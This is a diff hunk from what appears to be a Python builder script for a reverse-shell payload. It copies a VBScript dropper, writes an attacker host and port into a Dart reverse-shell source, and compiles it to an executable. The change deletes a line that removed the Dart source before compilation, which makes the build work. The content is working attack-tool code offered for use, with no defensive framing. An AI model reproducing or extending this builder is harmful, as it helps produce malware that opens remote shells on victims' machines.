@@ -50,7 +50,6 @@ else:
     os.system("powershell -c cp scripts/Dropper.vbs Dropper.vbs")
     replace_string("reverseshell.dart","$lhost",lhsot)
     replace_string("reverseshell.dart","$port",lport)
-    os.remove("reverseshell.dart")
     replace_string("Dropper.vbs","$ip",lhsot)
     print("[+] Compiling")
     os.system("dart compile exe reverseshell.dart")
